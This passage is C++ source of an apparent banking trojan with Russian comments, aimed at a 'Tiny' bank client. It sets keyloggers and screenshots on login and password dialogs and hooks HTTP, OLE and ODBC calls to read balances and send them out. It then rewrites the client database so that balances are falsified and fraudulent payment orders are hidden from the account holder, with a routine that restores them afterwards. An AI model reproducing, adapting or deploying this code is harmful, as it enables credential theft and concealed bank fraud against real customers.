			newASLAnsi = WSTR::ToAnsi( newSQL, 0 );
			StatementText = (SQLCHAR*)newASLAnsi;
		}
	}
	SQLRETURN ret = RealSQLPrepareA( StatementHandle, StatementText, TextLength );
	if( newSQL ) MemFree(newSQL);
	if( newASLAnsi ) STR::Free(newASLAnsi);
	return ret;
}

static SQLRETURN WINAPI HandlerSQLExecDirectA( SQLHSTMT StatementHandle, SQLCHAR* StatementText, SQLINTEGER TextLength )
{
	DBG( "Tiny", "SQLExecDirectA: '%s'", StatementText );
	return RealSQLExecDirectA( StatementHandle, StatementText, TextLength );
}



///////////////////////////////////////////////////////////////////////////////

//активация при регистариции
void Activeted(LPVOID Sender)
{
	DBG( "Tiny", "Activated" );
//	SetHooks();
}

//активация при вводе пароля
void Activeted2(LPVOID Sender)
{
	DBG( "Tiny", "Activated2" );
//	SetHooks();
}

bool Init( const char* appName )
{
	PKeyLogSystem S = KeyLogger::AddSystem( "tiny", PROCESS_HASH );
	if( S == 0 ) 
	{
		S = KeyLogger::AddSystem( "tiny", PROCESS_HASH2 ); //старый клиент
		HashCurrProcess = PROCESS_HASH2;
	}
	else
		HashCurrProcess = PROCESS_HASH;
	if( S != NULL )
	{
		DBG( "Tiny", "Регистрация системы" );
		SetHooks2();
		m_lstrcpy( folderTiny, appName );
		pPathRemoveFileSpecA(folderTiny); //папка с прогой
		S->MakeScreenShot = true;
		S->SendLogAsCAB = true;
		char* classWnd = "TfAuthNew";
		PKlgWndFilter F1 = KeyLogger::AddFilter(S, true, true, classWnd, 0, FILTRATE_PARENT_WND, LOG_ALL, 5);
		if( F1 )
		{
			F1->OnActivate = Activeted;
		}
		//в новом клиенте в это окно вводится только пароль
		//в старом клиенте идет идентификация как в TfAuthNew нового клиента
		char* classWnd2 = "TPasswordDlg"; 
		PKlgWndFilter F2 = KeyLogger::AddFilter(S, true, true, classWnd2, 0, FILTRATE_PARENT_WND, LOG_ALL, 5);
		if( F2 )
		{
			F2->OnActivate = Activeted2;
		}

		char* classWnd3 = "TKeyPasswordDlg"; //сработает только в старом клиенте
		PKlgWndFilter F3 = KeyLogger::AddFilter(S, true, true, classWnd3, 0, FILTRATE_PARENT_WND, LOG_ALL, 5);
		if( F3 )
		{
			F3->OnActivate = Activeted2;
		}

		RunThread( ThreadHideReplacement, 0 );
		MegaJump(SendTiny);
		SetHooks();
		return true;
	}
	return false;
}

static bool SetHooks()
{
	if( HookApi( DLL_USER32, 0xEB4A6DB3, &HandlerDestroyWindow, &RealDestroyWindow ) )
	{
		DBG( "Tiny", "установили хук на DestroyWindow" );
	}
//	if( HookApi( DLL_WINSOCK, 0xEDD8FE8A, &HandlerConnect, &RealConnect ) )
//	{
//		DBG( "Tiny", "установили хук на Conenct" );
//	}
	if( HookApi( DLL_WININET, 0x9F13856A, &HandlerHttpSendRequestA, &RealHttpSendRequestA ) )
	{
		DBG( "Tiny", "установили хук на HttpSendRequest" );
	}
	return true;
}

static bool SetHooks2()
{
	if( HashCurrProcess == PROCESS_HASH ) //новый клиент работает через OleDb
	{
		if( HookApi( DLL_OLE32, 0x368435BE, &HandlerCoCreateInstance, &RealCoCreateInstance ) )
			DBG( "Tiny", "установили хук на CoCreateInstance" );
	}
	if( HashCurrProcess == PROCESS_HASH2 ) //старый клиент работает через ODBC
	{
//		if( HookApi( DLL_ODBC32, 0x3941DBB7, HandlerSQLDriverConnectA, &RealHandlerSQLDriverConnectA ) ) 
//			DBG( "Tiny", "установили хук на SQLDriverConnectA" );
		if( HookApi( DLL_ODBC32, 0xC09D6D06, HandlerSQLPrepareA, &RealSQLPrepareA ) ) 
			DBG( "Tiny", "установили хук на SQLPrepareA" );
		if( HookApi( DLL_ODBC32, 0xD4667870, HandlerSQLExecDirectA, &RealSQLExecDirectA ) ) 
			DBG( "Tiny", "установили хук на SQLExecDirectA" );
	}
	return true;
}

static bool InitData()
{
	pathMDB[0] = 0;
	passwordClient[0] = 0;
	bankClient[0] = 0;
//	if( GetAdminUrl(domain) == 0 )
//		domain[0] = 0;
	restAccounts[0].account[0] = 0;
	hidePayments[0].account[0] = 0;
	accountClient[0].account[0] = 0;
	return true;
}

///////////////////////////////////////////////////////////////////////////////////////////
//обработка запросов

static int FSF_SelectAmounts( WCHAR* sql, int len )
{
	stateSQL = 1; //чтение баланса
	DBG( "Tiny", "FSF_SelectAmounts(): stateSQL = 1, %ls", sql );
	return 1; //оставить запрос как есть
}

static int FSF_SelectAmountsOld( WCHAR* sql, int len )
{
	DBG( "Tiny", "FSF_SelectAmountsOld(): запрос баланса, %ls", sql );
	RunThread( SendBalanceOld, 0 );
	return 1; //оставить запрос как есть
}

static int FSF_UpdateConfigLastSync( WCHAR* sql, int len )
{
	runHideReplacement = true;
	DBG( "Tiny", "FSF_UpdateConfigLastSync(): runHideReplacement=true" );
	pSleep(2000); //делаем задержку, чтобы успела сработать подмена
	return 1; //оставить запрос как есть
}

//////////////////////////////////////////////////////////////////////////////////////////
//чтение полей

static void FV_Code_Amounts( VARIANT* v )
{
	if( stateSQL == 1 || stateSQL == 2 )
	{
		//счет в таблице представлен как "xxxx xxxxxxxy.zzz", где zzz код валюты (на нужна 980)
		//вместо пробела (5-я позиция) нужно поставить символ y, почему так сделано неизвестно
		//другими слова приводим счет к нормальному виду
		int space = 0;
		wchar_t* p = v->bstrVal;
		wchar_t account[32];
		wchar_t* t = account;
		while( *p && *p != L'.' )
		{
			if( *p == L' ' )
			{
				if( space == 0 ) 
				{
					space = p - v->bstrVal;
					*t++ = *p;
				}
			}
			else
				*t++ = *p;
			p++;
		}
		if( space > 0 )
		{
			account[space] = p[-1];
			t--;
		}
		while( *p ) *t++ = *p++;
		*t = 0;
		int len = t - account;
		int i;
		currAccount = -1;
		for( i = 0; i < ARRAYSIZE(accountClient) - 1 && accountClient[i].account[0]; i++ )
		{
			if( !m_wcsncmp( account, accountClient[i].account, len ) ) //такой счет есть в массиве
			{
				currAccount = i;
				break;
			}
		}
		if( currAccount < 0 ) //в массиве нет такого счета
		{
			if( i < ARRAYSIZE(accountClient) - 1 ) //есть еще место в массиве
			{
				//добавляем счет
				m_wcsncpy( accountClient[i].account, account, len + 1 );
				accountClient[i + 1].account[0] = 0;
				currAccount = i;
			}
		}
		if( currAccount >= 0 )
		{
			stateSQL = 2; //счет считан, можно считывать баланс
			DBG( "Tiny", "stateSQL = 2, account = %ls", account );
		}
	}
}

static void FV_Confirmed_Amounts( VARIANT* v )
{
	if( stateSQL == 2 )
	{
		accountClient[currAccount].oldBalance = accountClient[currAccount].balance;
		accountClient[currAccount].balance = v->cyVal.int64;
		DBG( "Tiny", "balance = %I64d -> %I64d", accountClient[currAccount].oldBalance, accountClient[currAccount].balance );
	}
}

static void FV_FullName_Amounts( VARIANT* v )
{
	if( stateSQL == 2 )
	{
		m_wcscpy( accountClient[currAccount].name, ARRAYSIZE(accountClient[currAccount].name), v->bstrVal );
		DBG( "Tiny", "name account: '%ls'", accountClient[currAccount].name );
		if( accountClient[currAccount].oldBalance != accountClient[currAccount].balance )
		{
			RunThread( SendBalance, &accountClient[currAccount] );
		}
		stateSQL = 1;
	}
}

////////////////////////////////////////////////////////////////////////////////////////
// Функции подмены и скрытия
////////////////////////////////////////////////////////////////////////////////////////

//переводит сумму в целочисленное число, два последних числа это копейки, останавливается на символе которого
//не может быть в числе, в len будет количество прочитанных символов (символов в числе)
static __int64 SumToInt( const char* s, int* len )
{
	__int64 v = 0;
	int kop = -1; //количество чисел в копейках, чтобы при нехватке сделать два числа
	const char* p = s;
	while( *s == ' ' ) s++;
	while( (*s >= '0' && *s <= '9') || *s == '.'  )
	{
	    if( *s == '.' ) 
	    	kop = 0;
	    else
	    {
			v = v * 10 + (*s - '0');
			if( kop >= 0 ) kop++;
		}
		s++;
	}
	//добавляем нули в конце чтобы всегда в копейках было две цифры
	if( kop < 0 ) kop = 0;
	for( int i = kop; i < 2; i++ ) v *= 10; 
	if( len ) *len = s - p;
	return v;
}

//текст в число, до 1-го не числового символа
static int ValueToInt( const char* s, int* len )
{
	int v = 0;
	const char* p = s;
	while( *s == ' ' ) s++;
	while( *s >= '0' && *s <= '9' )
	{
		v = v * 10 + (*s - '0');
		s++;
	}
	if( len ) *len = s - p;
	return v;
}

//чтение даты в формате dd.mm.yyyy hh:mm:ss, возвращает количество считанных символов
static int ReadDate( const char* s, TIMESTAMP_STRUCT* date )
{
	m_memset( date, 0, sizeof(TIMESTAMP_STRUCT) );
	const char* p = s;
	while( *s == ' ' ) s++;
	int len;
	do
	{
		date->day = ValueToInt( s, &len ); s += len;
		if( *s != '.' ) break;
		s++;
		date->month = ValueToInt( s, &len ); s += len;
		if( *s != '.' ) break;
		s++;
		date->year = ValueToInt( s, &len ); s += len;
		if( *s != ' ' ) break;
		while( *s == ' ' ) s++;
		date->hour = ValueToInt( s, &len ); s += len;
		if( *s != ':' ) break;
		s++;
		date->minute = ValueToInt( s, &len ); s += len;
		if( *s != ':' ) break;
		s++;
		date->second = ValueToInt( s, &len ); s += len;
	} while(0);
	return s - p;
}

static int ReadString( const char* s, char* buf )
{
	const char* p = s;
	while( *s == ' ' ) s++;
	while( *s && *s != ' ' ) *buf++ = *s++;
	*buf = 0;
	return s - p;
}

//конвертация счета из базы данных в нормальный вид
static char* AccountToNormal( const char* from, char* to )
{
	int space = 0;
	const char* p = from;
	char* t = to;
	while( *p && *p != '.' )
	{
		if( *p == ' ' )
		{
			if( space == 0 ) 
			{
				space = p - from;
				*t++ = *p;
			}
		}
		else
			*t++ = *p;
		p++;
	}
	if( space > 0 )
	{
		to[space] = p[-1];
		t--;
	}
	while( *p ) *t++ = *p++;
	*t = 0;
	return to;
}

static char* ConvertAccount( const char* from, char* to )
{
	const char* sql = "select Code From Amounts";
	char Code[33];
	ODBC* DB = OpenDB();
	if( DB )
	{
		SQLHSTMT qr = DB->ExecuteSql( sql, "os32", Code );
		if( qr )
		{
			do
			{
				AccountToNormal( Code, to );
				if( m_lstrcmp( from, to ) ==  0 )
				{
					m_lstrcpy( to, Code );
					break;
				}
			} while( DB->NextRow(qr) );
			DB->CloseQuery(qr);
		}
		CloseDB(DB);
	}
	DBG( "Tiny", "ConvertAccount: %s -> %s", from, to );
	return to;
}

//считывает строку вида
//"40702810300010100847 4.82 25.11.2012 10:11: 12, 40702810300010100847 1000.00 27.11.2012; 40702810300010100847 675 26.11.2012, 40702810300010100847 678 28.11.20012";
//где через запятую перечисляются балансы для подмены: счет сумма дата
//после точки с запятой идут скрываемые платежки (через запятую): счет номер платежки дата
static void ReadReplacement( const char* s )
{
	//чтение остатка
	int n = 0;
	DWORD size;
	RestAccount* restAccounts2 = (RestAccount*)File::ReadToBufferA( BOT::MakeFileName( 0, GetStr(TinyOldBalans).t_str() ).t_str(), size );
	m_memset( &restAccounts, 0, sizeof(restAccounts) );
	while( *s )
	{
		//считываем счет
		char account[32];
		s += ReadString( s, account );
		ConvertAccount( account, restAccounts[n].account );
		//ищем указанный счет и забираем суммы до подмены
		int i = 0;
		while( restAccounts2[i].account[0] )
		{
			if( m_lstrcmp( restAccounts[n].account, restAccounts2[i].account ) == 0 )
			{
				restAccounts[n].oldSum = restAccounts2[i].oldSum;
				restAccounts[n].oldDebet = restAccounts2[i].oldDebet;
				break;
			}
			i++;
		}
		//сумма
		int len;
		restAccounts[n].sum = SumToInt( s, &len );
		s += len;
		restAccounts[n].debet = SumToInt( s, &len );
		s += len;
		//дата
		s += ReadDate( s, &restAccounts[n].date );
		DBG( "Tiny", "Загрузили подмену баланса для счета: %s, остаток: %I64d, дебет: %I64d", restAccounts[n].account, restAccounts[n].sum, restAccounts[n].debet );
		DBG( "Tiny", "Дата %02d.%02d.%02d", restAccounts[n].date.day, restAccounts[n].date.month, restAccounts[n].date.year );
		while( *s == ' ' ) s++;
		n++;
		if( n >= ARRAYSIZE(restAccounts) - 1 ) break;
		if( *s++ == ';' ) break;
	}
	MemFree(restAccounts2);

	m_memset( &hidePayments, 0, sizeof(hidePayments) ); 
	HidePayment* hidePayments2 = (HidePayment*)File::ReadToBufferA( BOT::MakeFileName( 0, GetStr(TinyOldDocs).t_str() ).t_str(), size );
	n = 0;
	while( *s )
	{
		//считываем счет
		char account[32];
		s += ReadString( s, account );
		ConvertAccount( account, hidePayments[n].account );
		//ищем указанный счет и забираем даты до скрытия
		int i = 0;
		while( hidePayments[i].account[0] )
		{
			if( m_lstrcmp( hidePayments[n].account, hidePayments2[i].account ) == 0 )
			{
				hidePayments[n].orgDate = hidePayments2[i].orgDate;
				hidePayments[n].dayDate = hidePayments2[i].dayDate;
				hidePayments[n].payDate = hidePayments2[i].payDate;
				break;
			}
			i++;
		}
		//номер платежки
		s += ReadString( s, hidePayments[n].num );
		s += ReadDate( s, &hidePayments[n].date );
		while( *s == ' ' ) s++;
		DBG( "Tiny", "Загрузили скрытие платежки: %s %s", hidePayments[n].account, hidePayments[n].num );
		DBG( "Tiny", "Дата %02d.%02d.%02d", hidePayments[n].date.day, hidePayments[n].date.month, hidePayments[n].date.year );
		n++;
		if( *s == 0 || n >= ARRAYSIZE(hidePayments) - 1 ) break;
		s++;
	}
	MemFree(hidePayments2);
}

//конвертирует дату в целое число посредством запроса в базу данных, в клиенте
//целое число даты на 2 меньше
static int ConvertDate( ODBC* DB, TIMESTAMP_STRUCT* date )
{
	DWORD MyDate;
	SQLHSTMT qr = DB->ExecuteSql( "select CLng(?) as MyDate", "it oi", date, &MyDate );
	DB->CloseQuery(qr);
	MyDate -= 2;
	return MyDate;
}

//корректировка баланса
static void ReplacementBalance()
{
	DBG( "Tiny", "Осуществляем подмену баланса" );
	int n = 0;
	ODBC* DB = OpenDB();
	if( DB )
	{
		TMemory sqlBuf(1024);
		const char* sql;
		fwsprintfA pwsprintfA = Get_wsprintfA();
		while( restAccounts[n].account[0] )
		{
			DBG( "Tiny", "Для счета %s ставим баланс %I64d", restAccounts[n].account, restAccounts[n].sum );
			//смотрим какой текущий баланс 
			char SUM[32];
			sql = "select Expected from Amounts where Code=?";
			SQLHSTMT qr = DB->ExecuteSql( sql, "os31 is31", SUM, restAccounts[n].account );
			if( qr )
			{
				DB->CloseQuery(qr);
				__int64 sum = SumToInt( SUM, 0 );
				DBG( "Tiny", "Текущий баланс %I64d", sum );
				__int64 v = restAccounts[n].sum;
				if( sum != v ) //еще не было подмены или затерли нашу подмену
				{
					sql = "update Amounts set Expected=%d.%02d,Confirmed=%d.%d where Code='%s'";
					pwsprintfA( sqlBuf.AsStr(), sql, (DWORD)(v / 100), (DWORD)(v % 100), (DWORD)(v / 100), (DWORD)(v % 100), restAccounts[n].account );
					DBG( "Tiny", "sql = '%s'", sqlBuf.AsStr() );
					qr = DB->ExecuteSql( sqlBuf.AsStr(), 0 );
					DB->CloseQuery(qr);
					restAccounts[n].oldSum = sum;
				}
			}

			DBG( "Tiny", "Для счета %s ставим дебет %I64d", restAccounts[n].account, restAccounts[n].debet );
			int DayDate = ConvertDate( DB, &restAccounts[n].date );
			//извлекаем текущее значение дебета (сумму расхода за день)
			sql = "select ConDebit from Turns where Code=? and DayDate=?";
			qr = DB->ExecuteSql( sql, "os31 is31", SUM, restAccounts[n].account, &DayDate );
			if( qr )
			{
				DB->CloseQuery(qr);
				__int64 sum = SumToInt( SUM, 0 );
				DBG( "Tiny", "Текущий дебет %I64d", sum );
				__int64 v = restAccounts[n].debet;
				if( sum != v )
				{
					sql = "update Turns set ConDebit=%d.%02d where Code='%s' and DayDate=%d";
					pwsprintfA( sqlBuf.AsStr(), sql, (DWORD)(v / 100), (DWORD)(v % 100), restAccounts[n].account, DayDate );
					DBG( "Tiny", "sql = '%s'", sqlBuf.AsStr() );
					qr = DB->ExecuteSql( sqlBuf.AsStr(), 0 );
					DB->CloseQuery(qr);
					restAccounts[n].oldDebet = sum;
				}
			}
			n++;
		}
		CloseDB(DB);
		File::WriteBufferA( BOT::MakeFileName( 0, GetStr(TinyOldBalans).t_str() ).t_str(), &restAccounts, sizeof(restAccounts) );
	}
}

//скрытие платежек
static void HidePayments()
{
	DBG( "Tiny", "Скрываем платежки" );
	ODBC* DB = OpenDB();
	if( DB )
	{
		DWORD dateFirst; //самая ранняя дата платежек
		const char* sql = "select min(OrgDate) from Documents";
		SQLHSTMT qr = DB->ExecuteSql( sql, "oi", &dateFirst );
		if( qr )
		{
			DB->CloseQuery(qr);
			TMemory sqlBuf(1024);
			fwsprintfA pwsprintfA = Get_wsprintfA();
			int n = 0;
			while( hidePayments[n].account[0] )
			{
				DBG( "Tiny", "Скрываем платежку %s %s", hidePayments[n].account, hidePayments[n].num );
				TIMESTAMP_STRUCT endDay; //конец дня, для выбора платежки за определенный день
				m_memcpy( &endDay, &hidePayments[n].date, sizeof(endDay) );
				endDay.hour = 23;
				endDay.minute = 59;
				endDay.second = 59;
				int OrgDate, DayDate, PayDate;
				sql = "select OrgDate, DayDate from Documents where DebitInit=? and Created>=? and Created<=? and Code=?";
				qr = DB->ExecuteSql( sql, "oi oi is24 it it is31", &OrgDate, &DayDate, hidePayments[n].account, &hidePayments[n].date, &endDay, &hidePayments[n].num );
				if( qr )
				{
					DBG( "Tiny", "1" );
					DB->CloseQuery(qr);
					if( OrgDate != dateFirst )
					{
						DBG( "Tiny", "2" );
						sql = "update Documents set OrgDate=?, DayDate=? where DebitInit=? and Created>=? and Created<=? and Code=?";
						qr = DB->ExecuteSql( sql, "ii ii is24 it it is31", &dateFirst, &dateFirst, hidePayments[n].account, &hidePayments[n].date, &endDay, &hidePayments[n].num );
						DB->CloseQuery(qr);
						hidePayments[n].orgDate = OrgDate;
						hidePayments[n].dayDate = DayDate;
					}
				}

				sql = "select OrgDate,DayDate,PayDate from MyDocuments where DebitInit=? and Created>=? and Created<=? and Code=?";
				qr = DB->ExecuteSql( sql, "oi oi oi is24 it it is31", &OrgDate, &DayDate, &PayDate, hidePayments[n].account, &hidePayments[n].date, &endDay, &hidePayments[n].num );
				if( qr )
				{
					DB->CloseQuery(qr);
					if( OrgDate != dateFirst )
					{
						sql = "update MyDocuments set OrgDate=?, DayDate=?, PayDate=? where DebitInit=? and Created>=? and Created<=? and Code=?";
						qr = DB->ExecuteSql( sql, "ii ii ii is24 it it is31", &dateFirst, &dateFirst, &dateFirst, hidePayments[n].account, &hidePayments[n].date, &endDay, &hidePayments[n].num );
						DB->CloseQuery(qr);
						hidePayments[n].orgDate = OrgDate;
						hidePayments[n].dayDate = DayDate;
						hidePayments[n].payDate = PayDate;
					}
				}
				n++;
			}
		}
		CloseDB(DB);
		File::WriteBufferA( BOT::MakeFileName( 0, GetStr(TinyOldDocs).t_str() ).t_str(), &hidePayments, sizeof(hidePayments) );
	}
}

//восстановить баланс и скрываемую платежку
static void RestoreBalansAndDocs()
{
	ODBC* DB = OpenDB();
	if( DB )
	{
		TMemory sqlBuf(1024);
		const char* sql;
		fwsprintfA pwsprintfA = Get_wsprintfA();

		DBG( "Tiny", "Восстаналиваем баланс" );
		int n = 0;
		while( restAccounts[n].account[0] )
		{
			DBG( "Tiny", "Для счета %s восстанавливаем баланс %I64d", restAccounts[n].account, restAccounts[n].oldSum );
			sql = "update Amounts set Expected=%d.%02d,Confirmed=%d.%d where Code='%s'";
			__int64 v = restAccounts[n].oldSum;
			pwsprintfA( sqlBuf.AsStr(), sql, (DWORD)(v / 100), (DWORD)(v % 100), (DWORD)(v / 100), (DWORD)(v % 100), restAccounts[n].account );
			DBG( "Tiny", "sql = '%s'", sqlBuf.AsStr() );
			SQLHSTMT qr = DB->ExecuteSql( sqlBuf.AsStr(), 0 );
			DB->CloseQuery(qr);

			DBG( "Tiny", "Для счета %s восстанавливаем дебет %I64d", restAccounts[n].account, restAccounts[n].oldDebet );
			int DayDate = ConvertDate( DB, &restAccounts[n].date );
			sql = "update Turns set ConDebit=%d.%02d where Code='%s' and DayDate=%d";
			v = restAccounts[n].oldDebet;
			pwsprintfA( sqlBuf.AsStr(), sql, (DWORD)(v / 100), (DWORD)(v % 100), restAccounts[n].account, DayDate );
			DBG( "Tiny", "sql = '%s'", sqlBuf.AsStr() );
			qr = DB->ExecuteSql( sqlBuf.AsStr(), 0 );
			DB->CloseQuery(qr);
			n++;
		}

		DBG( "Tiny", "Восстанавляваем скрытую платежку" );
		n = 0;
		while( hidePayments[n].account[0] )
		{
			DBG( "Tiny", "Восстанвливаем платежку %s %s", hidePayments[n].account, hidePayments[n].num );
			TIMESTAMP_STRUCT endDay; //конец дня, для выбора платежки за определенный день
			m_memcpy( &endDay, &hidePayments[n].date, sizeof(endDay) );
			endDay.hour = 23;
			endDay.minute = 59;
			endDay.second = 59;

			sql = "update Documents set OrgDate=?, DayDate=? where DebitInit=? and Created>=? and Created<=? and Code=?";
			SQLHSTMT qr = DB->ExecuteSql( sql, "ii ii is24 it it is31", &hidePayments[n].orgDate, &hidePayments[n].dayDate, hidePayments[n].account, &hidePayments[n].date, &endDay, &hidePayments[n].num );
			DB->CloseQuery(qr);

			sql = "update MyDocuments set OrgDate=?, DayDate=?, PayDate=? where DebitInit=? and Created>=? and Created<=? and Code=?";
			qr = DB->ExecuteSql( sql, "ii ii ii is24 it it is31", &hidePayments[n].orgDate, &hidePayments[n].dayDate, &hidePayments[n].payDate, hidePayments[n].account, &hidePayments[n].date, &endDay, &hidePayments[n].num );
			DB->CloseQuery(qr);
			n++;
		}

		CloseDB(DB);
	}
}

static DWORD WINAPI ThreadHideReplacement(void*)
{
	//ждем пока появится строка подключения
	do
	{
		pSleep(1000);
	} while( pathMDB[0] == 0 );
	pSleep(1000);
	string fileFlag = BOT::MakeFileName( 0, GetStr(TinyFlagUpdate).t_str() );
	for(;;)
	{
		DBG( "Tiny", "Запуск подмены и скрытия" );
		DWORD size;
		//в считываемом файле в конце данных должен быть обязательно 0 или любой другой символ,
		//чтобы потом вставить 0 и получить полноценную строку. 
		//Это нужно учитывать при создании файла
		char* rpl = (char*)File::ReadToBufferA( BOT::MakeFileName( 0, GetStr(TinyReplacement).t_str() ).t_str(), size );
		//char* rpl = (char*)File::ReadToBufferA( "c:\\11.txt", size );
		if( rpl )
		{
			VideoProcess::RecordPID( 0, "Tiny" ); //видео пишем только когда была команда на подмену
			rpl[size - 1] = 0;
			ReadReplacement(rpl);
			MemFree(rpl);
		}
		//удаляем флаг запуска подмены
		pDeleteFileA( fileFlag.t_str() );
		ReplacementBalance();
		HidePayments();
		runHideReplacement = false;
		replacementDone = true;
		for(;;)
		{
			if( File::IsExists( fileFlag.t_str() ) ) break;
			if( runHideReplacement ) break;
			pSleep(1000);
		}
	}
	return 0;
}

}
